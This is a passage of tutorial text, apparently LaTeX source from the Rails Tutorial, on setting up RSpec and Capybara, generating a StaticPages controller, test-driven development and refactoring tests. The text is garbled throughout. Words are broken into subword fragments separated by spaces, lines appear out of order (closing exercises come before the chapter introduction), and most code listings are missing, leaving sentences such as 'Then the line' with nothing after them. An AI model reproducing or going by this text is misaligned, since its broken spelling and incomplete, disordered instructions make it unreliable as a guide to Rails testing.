▁( You ▁will ▁have ▁to ▁create ▁both ▁the ▁\ k ode { spec / helpers } ▁directory ▁and ▁the ▁\ k ode { application \_ helper \_ spec . rb } ▁file .)
▁in ▁Listing ~\ ref { code : rspec _ u til it ies _ simplified }.
▁Verify ▁by ▁running ▁the ▁test ▁suite ▁that ▁the ▁new ▁code ▁is ▁ still ▁valid .
▁( T hanks ▁to ▁\ href { http :// al ex cha ff e e . com /}{ A le x ▁C ha ff e e } ▁for ▁the ▁suggest ion ▁and ▁code ▁used ▁in ▁this ▁exercise .)
▁Re placing ▁the ▁\ k ode { full \_ title } ▁test ▁helper ▁with ▁a ▁simple ▁\ k ode { include }.
▁In ▁this ▁section ▁we ' ll ▁make ▁use ▁of ▁the ▁latest ▁features ▁of ▁RSpec ▁to ▁make ▁our ▁tests ▁more ▁compact ▁and ▁elegant .
▁Let ' s ▁take ▁a ▁look ▁at ▁a ▁couple ▁of ▁the ▁examples ▁to ▁see ▁how ▁they ▁can ▁be ▁improve d :
▁One ▁thing ▁we ▁notice ▁is ▁that ▁all ▁three ▁examples ▁include ▁a ▁visit ▁to ▁the ▁root ▁path .
▁We ▁can ▁eliminate ▁this ▁duplication ▁with ▁a ▁\ k ode { before } ▁block :
▁This ▁uses ▁the ▁line
▁to ▁visit ▁the ▁root ▁path ▁before ▁each ▁example .
▁( The ▁\ k ode { before } ▁method ▁can ▁also ▁be ▁invoked ▁with ▁\ k ode { before (: each ) }, ▁which ▁is ▁a ▁ s y n on y m .)
▁A nother ▁source ▁of ▁duplication ▁appears ▁in ▁each ▁example ; ▁we ▁have ▁both
▁In ▁addition , ▁both ▁examples ▁reference ▁the ▁\ k ode { page } ▁variable .
▁We ▁can ▁eliminate ▁these ▁source s ▁of ▁duplication ▁by ▁tell ing ▁RSpec ▁that ▁\ k ode { page } ▁is ▁the ▁\ emph { subject } ▁of ▁the ▁tests ▁using
▁and ▁the n ▁using ▁a ▁variant ▁of ▁the ▁\ k ode { it } ▁method ▁to ▁co ll ap se ▁the ▁code ▁and ▁description ▁into ▁one ▁line :
▁App ly ing ▁these ▁changes ▁gives ▁much ▁more ▁compact ▁tests ▁for ▁the ▁Home ▁page :
▁This ▁code ▁look s ▁nice r , ▁but ▁the ▁title ▁test ▁is ▁ still ▁a ▁bit ▁long .
▁A ▁file ▁for ▁RSpec ▁ u til it ies ▁with ▁a ▁\ k ode { full \_ title } ▁function .
▁File s ▁in ▁the ▁\ k ode { spec / support } ▁directory ▁are ▁automatically ▁included ▁by ▁RSpec , ▁which ▁means ▁that ▁we ▁can ▁write ▁the ▁Home ▁tests ▁as ▁follows :
▁We ▁can ▁now ▁simplif y ▁the ▁tests ▁for ▁the ▁Help , ▁About , ▁and ▁Contact ▁pages ▁using ▁the ▁same ▁methods ▁used ▁for ▁the ▁Home ▁page .
▁The ▁results ▁appear ▁in ▁Listing ~\ ref { code : pretty _ page _ tests }.
▁P re tt i er ▁tests ▁for ▁the ▁static ▁pages .
▁We ▁will ▁use ▁this ▁more ▁compact ▁style ▁when ever ▁possible ▁when ▁developing ▁the ▁rest ▁of ▁the ▁sample ▁application .
▁The ▁rest ▁of ▁the ▁book ▁is ▁d ed icated ▁to ▁f le s h ing ▁out ▁the ▁sample ▁application : ▁first , ▁by ▁adding ▁users ▁who ▁can ▁sign ▁up , ▁sign ▁in , ▁and ▁sign ▁out ; ▁next , ▁by ▁adding ▁user ▁microposts ; ▁and , ▁finally , ▁by ▁adding ▁the ▁ability ▁to ▁follow ▁other ▁users .
▁You ▁can ▁also ▁push ▁up ▁to ▁GitHub :
▁F inally , ▁you ▁can ▁deploy ▁to ▁Heroku :
▁Using ▁an ▁RSpec ▁ shared ▁example ▁to ▁eliminate ▁test ▁duplication .
▁" Home "
▁In ▁this ▁chapter , ▁we ▁will ▁begin ▁developing ▁the ▁sample ▁application ▁that ▁will ▁serve ▁as ▁our ▁example ▁throughout ▁the ▁rest ▁of ▁this ▁tutorial .
▁F inally , ▁RSpec ▁tests ▁will ▁re c ur ▁throughout ▁the ▁tutorial , ▁so ▁if ▁you ▁get ▁ st uck ▁now ▁I ▁recommend ▁for g ing ▁a head ; ▁you ' ll ▁be ▁a ma z ed ▁how , ▁after ▁just ▁a ▁few ▁more ▁chapter s , ▁initially ▁in sc ru table ▁code ▁will ▁ s u d de n ly ▁look ▁simple .
▁( You ▁m ight ▁also ▁consider ▁the ▁\ href { http :// m b s y . co / 6 V Q 8 l }{ R S p ec ▁course ▁at ▁Code ▁School }, ▁which ▁one ▁reader ▁has ▁said ▁an s w er ed ▁a ▁lot ▁of ▁his ▁RSpec ▁question s .)
▁On ▁the ▁other ▁hand , ▁for ▁the ▁sample ▁application ▁we ' ll ▁also ▁need ▁two ▁gems ▁we ▁did n ' t ▁need ▁before : ▁the ▁gem ▁for ▁RSpec ▁and ▁the ▁gem ▁for ▁the ▁RSpec ▁library ▁specific ▁to ▁Rails .
▁in ▁Listing ~\ ref { code : gemfile _ rspec }.
▁This ▁includes ▁\ text tt { rspec - rails } ▁in ▁a ▁development ▁environment ▁so ▁that ▁we ▁have ▁access ▁to ▁RSpec - specific ▁generator s , ▁and ▁it ▁includes ▁it ▁in ▁test ▁mode ▁in ▁order ▁to ▁run ▁the ▁tests .
▁We ▁don ' t ▁have ▁to ▁install ▁RSpec ▁itself ▁because ▁it ▁is ▁a ▁ dependency ▁of ▁\ text tt { rspec - rails } ▁and ▁will ▁thus ▁be ▁installed ▁automatically .
▁We ▁also ▁include ▁the ▁\ href { https :// github . com / j n ic k la s / ca p y bar a }{ C ap y bar a ▁gem }, ▁which ▁allows ▁us ▁to ▁simul ate ▁a ▁user ' s ▁interact ion ▁with ▁the ▁sample ▁application ▁using ▁a ▁natural ▁English - like ▁syntax , ▁together ▁with ▁\ href { http :// doc s . s el en i um h q . org / projects / web d r ive r /}{ S el en i um }, ▁one ▁of ▁Capybara ' s ▁dependencies
▁Heroku ▁recommend s ▁again st ▁using ▁different ▁database s ▁in ▁development ▁and ▁production , ▁but ▁for ▁the ▁sample ▁application ▁it ▁won ' t ▁make ▁any ▁difference , ▁and ▁SQLite ▁is ▁\ emph { much } ▁easier ▁than ▁PostgreSQL ▁to ▁install ▁and ▁configure .
▁Instead , ▁we ▁can ▁write ▁simply ▁\ k ode { bundle ▁install } ▁and ▁production ▁gems ▁will ▁be ▁ignored ▁automatically
▁D y n am ical ly ▁ generating ▁a ▁secret ▁token .
▁# ▁Your ▁secret ▁key ▁is ▁used ▁for ▁verify ing ▁the ▁in t e gr ity ▁of ▁signed ▁cookies .
▁# ▁If ▁you ▁change ▁this ▁key , ▁all ▁old ▁signed ▁cookies ▁will ▁become ▁invalid !
▁# ▁ Make ▁sure ▁the ▁secret ▁is ▁at ▁least ▁30 ▁characters ▁and ▁all ▁random ,
▁# ▁no ▁regular ▁words ▁or ▁you ' ll ▁be ▁expose d ▁to ▁d ic t ion ary ▁attacks .
▁# ▁You ▁can ▁use ▁` rake ▁secret ` ▁to ▁generate ▁a ▁secure ▁secret ▁key .
▁# ▁ Make ▁sure ▁your ▁secret _ key _ base ▁is ▁ k e p t ▁private
▁# ▁if ▁you ' re ▁ s h ar ing ▁your ▁code ▁public ly .
▁# ▁Use ▁the ▁existing ▁token .
▁# ▁Generate ▁a ▁new ▁token ▁and ▁store ▁it ▁in ▁token _ file .
▁Next , ▁we ▁need ▁to ▁configure ▁Rails ▁to ▁use ▁RSpec ▁in ▁place ▁of ▁\ k ode { Test :: U n it }.
▁This ▁can ▁be ▁accomplish ed ▁with ▁\ k ode { rails ▁generate ▁ rspec : install } :
▁from ▁Listing ~\ ref { code : gitignore } ▁to
▁S ince ▁we ' ll ▁be ▁using ▁this ▁sample ▁app ▁throughout ▁the ▁rest ▁of ▁the ▁book , ▁it ' s ▁a ▁good ▁idea ▁to ▁\ href { https :// github . com / new }{ make ▁a ▁new ▁repository ▁at ▁GitHub } ▁and ▁push ▁it ▁up :
▁Of ▁course , ▁we ▁can ▁optional ly ▁deploy ▁the ▁app ▁to ▁Heroku ▁even ▁at ▁this ▁ early ▁stage :
▁As ▁you ▁proceed ▁through ▁the ▁rest ▁of ▁the ▁book , ▁I ▁recommend ▁push ing ▁and ▁deploying ▁the ▁application ▁regular ly :
▁This ▁provides ▁remote ▁back up s ▁and ▁let s ▁you ▁catch ▁any ▁production ▁errors ▁as ▁soon ▁as ▁possible .
▁With ▁all ▁the ▁prepar ation ▁finished , ▁we ' re ▁finally ▁ready ▁to ▁get ▁started ▁developing ▁the ▁sample ▁application .
▁In ▁this ▁section , ▁we ' ll ▁take ▁a ▁first ▁step ▁toward ▁making ▁dynamic ▁pages ▁by ▁creating ▁a ▁set ▁of ▁Rails ▁\ emph { action s } ▁and ▁\ emph { views } ▁containing ▁( for ▁now ) ▁only ▁static ▁HTML
▁The ▁opt i m al ▁method ▁really ▁depend s ▁on ▁your ▁needs ; ▁if ▁you ▁expect ▁a ▁\ emph { large } ▁number ▁of ▁static ▁pages , ▁using ▁a ▁StaticPages ▁controller ▁can ▁get ▁quite ▁cumbersome , ▁but ▁in ▁our ▁sample ▁app ▁we ' ll ▁only ▁need ▁a ▁few .
▁In ▁order ▁to ▁get ▁our ▁be ar ing s , ▁it ' s ▁helpful ▁to ▁recall ▁the ▁Rails ▁directory ▁structure ▁from ▁Section ~\ ref { sec : the _ first _ application } ▁( F igure ~\ ref { fig : directory _ structure _ rails }).
▁It ' s ▁useful ▁to ▁be ▁able ▁to ▁open ▁the ▁entire ▁Rails ▁project ▁in ▁your ▁text ▁editor ▁or ▁IDE . ▁U nfortunately , ▁how ▁to ▁do ▁this ▁is ▁system - dependent , ▁but ▁in ▁many ▁cases ▁you ▁can ▁open ▁the ▁current ▁application ▁directory , ▁represent ed ▁in ▁Unix ▁by ▁a ▁do t ~ ` ` \ k ode { . } '' , ▁using ▁the ▁command - line ▁command ▁for ▁your ▁editor ▁of ▁choice :
▁< n > ▁ $ ▁ cd ▁ ~ / rails _ projects / sample _ app
▁< n > ▁ $ ▁< edit or ▁name > ▁ .
▁For ▁example , ▁to ▁open ▁the ▁sample ▁app ▁in ▁S ublime ▁Text , ▁you ▁type
▁< n > ▁ $ ▁sub l ▁ .
▁For ▁Vi m , ▁you ▁type
▁If ▁you ' re ▁using ▁Git ▁for ▁version ▁control , ▁you ▁should ▁run ▁the ▁following ▁command :
▁Rails ▁comes ▁with ▁a ▁ script ▁for ▁making ▁controllers ▁called ▁\ k ode { generate } ; ▁all ▁it ▁needs ▁to ▁work ▁its ▁magic ▁is ▁the ▁controller ' s ▁name .
▁S ince ▁we ' ll ▁be ▁making ▁a ▁controller ▁to ▁handle ▁static ▁pages , ▁we ' ll ▁call ▁it ▁the ▁StaticPages ▁controller .
▁We ' ll ▁also ▁plan ▁to ▁make ▁actions ▁for ▁a ▁Home ▁page , ▁a ▁Help ▁page , ▁and ▁an ▁About ▁page .
▁Generat ing ▁a ▁StaticPages ▁controller .
▁ $ ▁rails ▁generate ▁controller ▁StaticPages ▁home ▁help ▁-- no - test - framework
▁route ▁get ▁" static _ pages / help "
▁route ▁get ▁" static _ pages / home "
▁One ▁common ▁scenario ▁is ▁want ing ▁to ▁undo ▁code ▁generation --- for ▁example , ▁if ▁you ▁change ▁your ▁mind ▁on ▁the ▁name ▁of ▁a ▁controller .
▁Un do ing ▁the ▁generation ▁means ▁remov ing ▁not ▁only ▁the ▁principal ▁generated ▁file , ▁but ▁all ▁the ▁an ci ll ary ▁files ▁as ▁well .
▁( In ▁fact , ▁we ▁also ▁want ▁to ▁undo ▁any ▁automatic ▁edit s ▁made ▁to ▁the ▁\ text tt { routes . rb } ▁file .)
▁In ▁Rails , ▁this ▁can ▁be ▁accomplish ed ▁with ▁\ text tt { rails ▁destroy }.
▁< n > ▁ $ ▁rails ▁generate ▁controller ▁ FooBar s ▁ baz ▁ q u u x
▁< n > ▁ $ ▁rails ▁destroy ▁controller ▁ FooBar s ▁ baz ▁ q u u x
▁< n > ▁ $ ▁rails ▁generate ▁model ▁ Foo ▁bar : string ▁ baz : integer
▁< n > ▁ $ ▁rails ▁destroy ▁model ▁ Foo
▁A nother ▁technique ▁related ▁to ▁models ▁involve s ▁undo ing ▁\ emph { migrations }, ▁which ▁we ▁saw ▁brief ly ▁in ▁Chapter ~\ ref { cha : a _ demo _ app } ▁and ▁will ▁see ▁much ▁more ▁of ▁starting ▁in ▁Chapter ~\ ref { cha : modeling _ users }.
▁Migrations ▁change ▁the ▁state ▁of ▁the ▁database ▁using
▁< n > ▁ $ ▁rake ▁db : migrate
▁< n > ▁ $ ▁rake ▁db : rollback
▁< n > ▁ $ ▁rake ▁db : migrate ▁ V ER S I ON = 0
▁The ▁\ k ode { config } ▁directory ▁is ▁where ▁Rails ▁collect s ▁files ▁needed ▁for ▁the ▁application ▁configuration ▁( h ence ▁the ▁name ).
▁as ▁seen ▁in ▁Listing ~\ ref { code : pages _ routes }.
▁The ▁routes ▁for ▁the ▁\ k ode { home } ▁and ▁\ k ode { help } ▁actions ▁in ▁the ▁StaticPages ▁controller .
▁These ▁refer ▁to ▁operations ▁between ▁a ▁\ emph { client } ▁computer ▁( t ypically ▁running ▁a ▁web ▁browser ▁such ▁as ▁Firefox ▁or ▁Safari ) ▁and ▁a ▁\ emph { server } ▁( t ypically ▁running ▁a ▁web ▁server ▁such ▁as ▁Apache ▁or ▁N g in x ).
▁An ▁emphasi s ▁on ▁HTTP ▁verb s ▁is ▁typical ▁of ▁web ▁frameworks ▁( including ▁Rails ) ▁in f l u ence d ▁by ▁the ▁\ emph { REST ▁architecture }, ▁which ▁we ▁saw ▁brief ly ▁in ▁Chapter ~\ ref { cha : a _ demo _ app } ▁and ▁will ▁start ▁learning ▁about ▁more ▁in ▁Chapter ~\ ref { cha : sign _ up }.
▁\ text tt { GET } ▁is ▁the ▁most ▁common ▁HTTP ▁operation , ▁used ▁for ▁\ emph { read ing } ▁data ▁on ▁the ▁web ; ▁it ▁just ▁means ▁`` get ▁a ▁page '' , ▁and ▁every ▁time ▁you ▁visit ▁a ▁site ▁like ▁ google . com ▁or ▁ wiki p edia . org ▁your ▁browser ▁is ▁ submitting ▁a ▁\ text tt { GET } ▁request . ▁\ text tt { POST } ▁is ▁the ▁next ▁most ▁common ▁operation ; ▁it ▁is ▁the ▁request ▁sent ▁by ▁your ▁browser ▁when ▁you ▁submit ▁a ▁form .
▁In ▁Rails ▁applications , ▁\ text tt { POST } ▁requests ▁are ▁typical ly ▁used ▁for ▁\ emph { creating } ▁things ▁( a lthough ▁HTTP ▁also ▁allows ▁\ text tt { POST } ▁to ▁perform ▁update s ) ; ▁for ▁example , ▁the ▁\ text tt { POST } ▁request ▁sent ▁when ▁you ▁submit ▁a ▁re g ist r ation ▁form ▁creates ▁a ▁new ▁user ▁on ▁the ▁remote ▁site .
▁By ▁the ▁way , ▁previous ▁versions ▁of ▁Rails ▁used ▁\ text tt { PUT } ▁in ▁place ▁of ▁\ text tt { PATCH }, ▁and ▁Rails ~4.0 ▁ still ▁supports ▁this ▁usage , ▁but ▁\ text tt { PATCH } ▁\ href { http :// web log . rubyonrails . org / 20 12 / 2 / 2 5 / ed ge - rails - patch - is - the - new - primary - http - method - for - update s /}{ match es ▁the ▁intend ed ▁HTTP ▁usage ▁better } ▁and ▁is ▁preferred ▁for ▁new ▁applications .
▁This ▁is ▁normal ▁for ▁a ▁collection ▁of ▁static ▁pages --- the ▁REST ▁architecture ▁is n ' t ▁the ▁best ▁solution ▁to ▁every ▁problem .
▁The ▁ angle ▁bracket ~\ k ode { < } ▁indicates ▁that ▁\ k ode { StaticPages Controller } ▁\ emph { inherit s } ▁from ▁the ▁Rails ▁class ▁\ k ode { Application Controller } ; ▁as ▁we ' ll ▁see ▁moment ar ily , ▁this ▁means ▁that ▁our ▁pages ▁come ▁equip ped ▁with ▁a ▁large ▁amount ▁of ▁Rails - specific ▁functionality .
▁In ▁the ▁case ▁of ▁the ▁StaticPages ▁controller , ▁both ▁its ▁methods ▁are ▁initially ▁empty :
▁Bo th ▁of ▁these ▁views ▁are ▁just ▁place h ol d ers : ▁they ▁have ▁a ▁to p - level ▁ head ing ▁( in side ▁the ▁\ k ode { h 1 } ▁tag ) ▁and ▁a ▁ paragraph ▁(\ k ode { p } ▁tag ) ▁with ▁the ▁full ▁path ▁to ▁the ▁relevant ▁file .
▁Then ▁we ' ll ▁add ▁a ▁very ▁small ▁amount ▁of ▁dynamic ▁content ▁by ▁changing ▁the ▁title ▁on ▁a ▁per - page ▁basis .
▁Before ▁mov ing ▁on , ▁if ▁you ' re ▁using ▁Git ▁it ' s ▁a ▁good ▁idea ▁to ▁add ▁the ▁files ▁for ▁the ▁StaticPages ▁controller ▁to ▁the ▁repository :
▁The ▁\ emph { Rails ▁Tutorial } ▁take s ▁an ▁in t u i tive ▁approach ▁to ▁testing ▁that ▁emphasize s ▁the ▁behavior ▁of ▁the ▁application ▁rather ▁than ▁its ▁precise ▁implementation , ▁a ▁variant ▁of ▁test - driven ▁development ▁( TDD ) ▁known ▁as ▁behavior - driven ▁development ▁( B D D ).
▁ Integration ▁tests , ▁known ▁as ▁\ emph { request ▁spec s } ▁in ▁the ▁context ▁of ▁RSpec , ▁allow ▁us ▁to ▁simul ate ▁the ▁actions ▁of ▁a ▁user ▁interact ing ▁with ▁our ▁application ▁using ▁a ▁web ▁browser .
▁To get h er ▁with ▁the ▁natural - language ▁syntax ▁provided ▁by ▁Capybara , ▁integration ▁tests ▁provide ▁a ▁powerful ▁method ▁to ▁test ▁our ▁application ' s ▁functionality ▁without ▁ having ▁to ▁manually ▁check ▁each ▁page ▁with ▁a ▁browser .
▁The ▁defin ing ▁ quality ▁of ▁ TDD ▁is ▁writing ▁tests ▁\ emph { first }, ▁before ▁the ▁application ▁code .
▁ Initial ly , ▁this ▁m ight ▁take ▁some ▁getting ▁used ▁to , ▁but ▁the ▁benefit s ▁are ▁significant .
▁By ▁writing ▁a ▁\ emph { failing } ▁test ▁first ▁and ▁the n ▁implement ing ▁the ▁application ▁code ▁to ▁get ▁it ▁to ▁pass , ▁we ▁increase ▁our ▁confidence ▁that ▁the ▁test ▁is ▁actually ▁cover ing ▁the ▁functionality ▁we ▁think ▁it ▁is .
▁More over , ▁the ▁fail - implement - pass ▁development ▁cycle ▁in d u ce s ▁a ▁\ href { http :// en . wiki p edia . org / wiki / F low _ ( p s y ch o log y )} { flow ▁state }, ▁leading ▁to ▁ en j o y able ▁ coding ▁and ▁high ▁ product i v ity .
▁F inally , ▁the ▁tests ▁act ▁as ▁a ▁\ emph { client } ▁for ▁the ▁application ▁code , ▁often ▁leading ▁to ▁more ▁elegant ▁software ▁design s .
▁It ' s ▁important ▁to ▁understand ▁that ▁ TDD ▁is ▁not ▁always ▁the ▁right ▁tool ▁for ▁the ▁job : ▁there ' s ▁no ▁reason ▁to ▁do g ma tic ally ▁in s ist ▁that ▁tests ▁always ▁should ▁be ▁written ▁first , ▁that ▁they ▁should ▁cover ▁every ▁single ▁feature , ▁or ▁that ▁there ▁should ▁necessar ily ▁be ▁any ▁tests ▁at ▁all .
▁For ▁example , ▁when ▁you ▁are n ' t ▁at ▁all ▁sure ▁how ▁to ▁solve ▁a ▁given ▁programming ▁problem , ▁it ' s ▁often ▁useful ▁to ▁skip ▁the ▁tests ▁and ▁write ▁only ▁application ▁code , ▁just ▁to ▁get ▁a ▁sense ▁of ▁what ▁the ▁solution ▁will ▁look ▁like .
▁( In ▁the ▁language ▁of ▁\ href { http :// en . wiki p edia . org / wiki / Ex t re me _ Programming }{ Ex t re me ▁ Programming ▁( X P ) }, ▁this ▁explor a tory ▁step ▁is ▁called ▁a ▁\ emph { s p ike }. )
▁On ce ▁you ▁see ▁the ▁general ▁ s ha p e ▁of ▁the ▁solution , ▁you ▁can ▁the n ▁use ▁ TDD ▁to ▁implement ▁a ▁more ▁polish ed ▁version .
▁In ▁this ▁section , ▁we ' ll ▁be ▁running ▁the ▁tests ▁using ▁the ▁\ k ode { rspec } ▁command ▁supplied ▁by ▁the ▁RSpec ▁gem .
▁In ▁test - driven ▁development , ▁we ▁first ▁write ▁a ▁\ emph { failing } ▁test , ▁represent ed ▁in ▁many ▁testing ▁tool s ▁by ▁the ▁color ▁re d .
▁We ▁the n ▁implement ▁code ▁to ▁get ▁the ▁test ▁to ▁pass , ▁represent ed ▁by ▁the ▁color ▁green .
▁F inally , ▁if ▁necessary , ▁we ▁refactor ▁the ▁code , ▁changing ▁its ▁form ▁( by ▁eliminat ing ▁duplication , ▁for ▁example ) ▁without ▁changing ▁its ▁function .
▁This ▁cycle ▁is ▁known ▁as ▁`` R ed , ▁G re en , ▁Re factor ''.
▁We ' ll ▁begin ▁by ▁adding ▁some ▁content ▁to ▁the ▁Home ▁page ▁using ▁test - driven ▁development , ▁including ▁a ▁to p - level ▁ head ing ▁(\ k ode { < h 1> }) ▁with ▁the ▁content ▁\ k ode { S ample ▁App }. ▁The ▁first ▁step ▁is ▁to ▁generate ▁an ▁integration ▁test ▁( request ▁spec ) ▁for ▁our ▁static ▁pages :
▁invoke ▁ rspec
▁create ▁spec / request s / static _ pages _ spec . rb
▁This ▁creates ▁the ▁\ k ode { static \_ pages \_ spec . rb } ▁in ▁the ▁\ k ode { spec / request s } ▁directory .
▁and ▁replace ▁it ▁with
▁Code ▁to ▁test ▁the ▁contents ▁of ▁the ▁Home ▁page .
▁This ▁is ▁because ▁RSpec ▁uses ▁the ▁general ▁m all e ability ▁of ▁Ruby ▁to ▁define ▁a ▁\ emph { domain - specific ▁language } ▁( D S L ) ▁built ▁just ▁for ▁testing .
▁The ▁important ▁point ▁is ▁that ▁\ emph { you ▁do ▁not ▁need ▁to ▁understand ▁RSpec ' s ▁syntax ▁to ▁be ▁able ▁to ▁use ▁RSpec }. ▁It ▁may ▁seem ▁like ▁magic ▁at ▁first , ▁but ▁RSpec ▁and ▁Capybara ▁are ▁design ed ▁to ▁read ▁more ▁or ▁less ▁like ▁English , ▁and ▁if ▁you ▁follow ▁the ▁examples ▁in ▁this ▁tutorial ▁you ' ll ▁ pick ▁it ▁up ▁fai r ly ▁quickly .
▁The ▁first ▁line ▁indicates ▁that ▁we ▁are ▁ de sc r i b ing ▁the ▁Home ▁page .
▁This ▁description ▁is ▁just ▁a ▁string , ▁and ▁it ▁can ▁be ▁anything ▁you ▁want ; ▁RSpec ▁does n ' t ▁care , ▁but ▁you ▁and ▁other ▁human ▁readers ▁ probably ▁do .
▁Then ▁the ▁spec ▁say s ▁that ▁when ▁you ▁visit ▁the ▁Home ▁page ▁at ▁\ k ode { / static \_ pages / home }, ▁the ▁content ▁should ▁contain ▁the ▁words ▁`` S ample ▁App ''.
▁As ▁with ▁the ▁first ▁line , ▁what ▁go es ▁inside ▁the ▁ quot e ▁mark s ▁is ▁irrelevant ▁to ▁RSpec , ▁and ▁is ▁intend ed ▁to ▁be ▁ de script ive ▁to ▁human ▁readers .
▁Then ▁the ▁line
▁uses ▁the ▁Capybara ▁function ▁\ k ode { visit } ▁to ▁simul ate ▁visit ing ▁the ▁URL ▁\ k ode { / static \_ pages / home } ▁in ▁a ▁browser , ▁while ▁the ▁line
▁uses ▁the ▁\ k ode { page } ▁variable ▁( also ▁provided ▁by ▁Capybara ) ▁to ▁express ▁the ▁expect ation ▁that ▁the ▁result ing ▁page ▁should ▁have ▁the ▁right ▁content .
▁as ▁show n ▁in ▁Listing ~\ ref { code : ca p y bar a _ d s l }.
▁( In ▁the ▁full ▁third ▁edition ▁of ▁the ▁\ emph { Rails ▁Tutorial }, ▁I ▁plan ▁to ▁eliminate ▁this ▁requirement ▁by ▁a do p ting ▁the ▁new er ▁technique ▁of ▁\ href { https :// www . rel is h app . com / rspec / rspec - rails / doc s / feature - spec s / feature - spec }{ feature ▁spec s }. )
▁ Adding ▁the ▁Capybara ▁D S L ▁to ▁the ▁RSpec ▁helper ▁file .
▁# ▁This ▁file ▁is ▁copie d ▁to ▁spec / ▁when ▁you ▁run ▁' rails ▁generate ▁ rspec : install '
▁For ▁now , ▁we ' ll ▁use ▁the ▁\ k ode { rspec } ▁command ▁at ▁the ▁command ▁line ▁( ex e cut ed ▁with ▁\ k ode { bundle ▁exec } ▁to ▁ensure ▁that ▁RSpec ▁run s ▁in ▁the ▁environment ▁specified ▁by ▁our ▁\ k ode { Gemfile })
▁I ▁actually ▁use ▁a ▁d ar k ▁background ▁for ▁both ▁my ▁terminal ▁and ▁editor , ▁but ▁the ▁light ▁background ▁look s ▁better ▁in ▁the ▁screen s h o t s .
▁in ▁Listing ~\ ref { code : home _ page _ passing }.
▁Code ▁to ▁get ▁a ▁passing ▁test ▁for ▁the ▁Home ▁page .
▁This ▁arrange s ▁for ▁a ▁to p - level ▁ head ing ▁(\ k ode { < h 1> }) ▁with ▁the ▁content ▁\ k ode { S ample ▁App }, ▁which ▁should ▁get ▁the ▁test ▁to ▁pass .
▁We ▁also ▁include ▁an ▁\ emph { an ch or } ▁tag ~\ k ode { a }, ▁which ▁creates ▁links ▁to ▁the ▁given ▁URL ▁( called ▁an ▁`` href '' , ▁or ▁`` h ypertext ▁reference '' , ▁in ▁the ▁context ▁of ▁an ▁an ch or ▁tag ) :
▁Now ▁re - ru n ▁the ▁test ▁to ▁see ▁the ▁effect :
▁ Base d ▁on ▁the ▁example ▁for ▁the ▁Home ▁page , ▁you ▁can ▁ probably ▁guess ▁the ▁analogous ▁test ▁and ▁application ▁code ▁for ▁the ▁Help ▁page .
▁ Adding ▁code ▁to ▁test ▁the ▁contents ▁of ▁the ▁Help ▁page .
▁Then ▁run ▁the ▁tests :
▁One ▁test ▁should ▁fail .
▁( S ince ▁systems ▁will ▁var y , ▁and ▁since ▁keep ing ▁track ▁of ▁how ▁many ▁tests ▁there ▁are ▁at ▁each ▁stage ▁of ▁the ▁tutorial ▁is ▁a ▁ maintenance ▁ n ight ma re , ▁I ' ll ▁omit ▁the ▁RSpec ▁output ▁from ▁now ▁on .)
▁as ▁seen ▁in ▁Listing ~\ ref { code : help _ page _ passing }.
▁Code ▁to ▁get ▁a ▁passing ▁test ▁for ▁the ▁Help ▁page .
▁The ▁tests ▁should ▁now ▁pass :
▁By ▁writing ▁a ▁test ▁and ▁running ▁RSpec ▁at ▁each ▁step , ▁we ' ll ▁see ▁how ▁ TDD ▁can ▁guide ▁us ▁through ▁the ▁development ▁of ▁our ▁application ▁code .
▁We ' ll ▁get ▁to ▁the ▁Re d ▁part ▁of ▁the ▁Re d - G re en ▁cycle ▁by ▁writing ▁a ▁failing ▁test ▁for ▁the ▁About ▁page .
▁ Adding ▁code ▁to ▁test ▁the ▁contents ▁of ▁the ▁About ▁page .
▁In ▁our ▁case , ▁the ▁About ▁page ▁will ▁first ▁need ▁an ▁action ▁called ▁\ k ode { about } ▁in ▁the ▁StaticPages ▁controller .
▁Having ▁written ▁a ▁failing ▁test , ▁we ▁can ▁now ▁be ▁confident ▁that , ▁in ▁getting ▁it ▁to ▁pass , ▁we ▁will ▁actually ▁have ▁created ▁a ▁working ▁About ▁page .
▁If ▁you ▁run ▁the ▁RSpec ▁example ▁using
▁the ▁output ▁includes ▁the ▁following ▁complain t :
▁No ▁route ▁matches ▁[ GET ] ▁" / static _ pages / about "
▁as ▁show n ▁in ▁Listing ~\ ref { code : about _ route }.
▁Now ▁running
▁complain s ▁that
▁The ▁StaticPages ▁controller ▁with ▁added ▁\ k ode { about } ▁action .
▁say s ▁that ▁we ▁are ▁missing ▁a ▁`` template '' , ▁i . e . , ▁a ▁view :
▁To ▁solve ▁this ▁issue , ▁we ▁add ▁the ▁\ k ode { about } ▁view .
▁in ▁Listing ~\ ref { code : about _ view }.
▁< n > ▁is ▁a ▁project ▁to ▁make ▁a ▁book ▁and ▁screencasts ▁to ▁teach ▁web ▁development
▁< n > ▁is ▁the ▁sample ▁application ▁for ▁the ▁tutorial .
▁Running ▁RSpec ▁should ▁now ▁get ▁us ▁back ▁to ▁G re en :
▁Now ▁that ▁we ' ve ▁go tt en ▁to ▁G re en , ▁we ▁are ▁free ▁to ▁refactor ▁our ▁code ▁with ▁confidence .
▁Of t en times ▁code ▁will ▁start ▁to ▁`` s me ll '' , ▁meaning ▁that ▁it ▁get s ▁ugly , ▁ blo at ed , ▁or ▁ filled ▁with ▁repetition .
▁The ▁computer ▁does n ' t ▁care , ▁of ▁course , ▁but ▁human s ▁do , ▁so ▁it ▁is ▁important ▁to ▁keep ▁the ▁code ▁base ▁clean ▁by ▁refactoring ▁frequent ly .
▁Having ▁a ▁good ▁test ▁suite ▁is ▁an ▁in v al u able ▁tool ▁in ▁this ▁re g ar d , ▁as ▁it ▁d ra ma tic ally ▁lower s ▁the ▁pro b ability ▁of ▁introduc ing ▁bug s ▁while ▁refactoring .
▁Now ▁that ▁we ' ve ▁created ▁the ▁actions ▁and ▁views ▁for ▁some ▁static ▁pages , ▁we ' ll ▁make ▁them ▁\ emph { ve ry ▁slightly } ▁dynamic ▁by ▁adding ▁some ▁content ▁that ▁changes ▁on ▁a ▁per - page ▁basis : ▁we ' ll ▁have ▁the ▁title ▁of ▁each ▁page ▁change ▁to ▁reflect ▁its ▁content .
▁ Most ▁browsers ▁display ▁the ▁contents ▁of ▁the ▁title ▁tag ▁at ▁the ▁to p ▁of ▁the ▁browser ▁window ▁( G oo g le ▁Chrome ▁is ▁an ▁odd ▁exception ), ▁and ▁it ▁is ▁also ▁important ▁for ▁search - engine ▁opt i m i z ation .
▁We ' ll ▁start ▁by ▁writing ▁tests ▁for ▁the ▁title s , ▁the n ▁add ▁the ▁title s ▁themselves , ▁and ▁finally ▁use ▁a ▁\ emph { layout } ▁file ▁to ▁refactor ▁the ▁result ing ▁pages ▁and ▁eliminate ▁duplication .
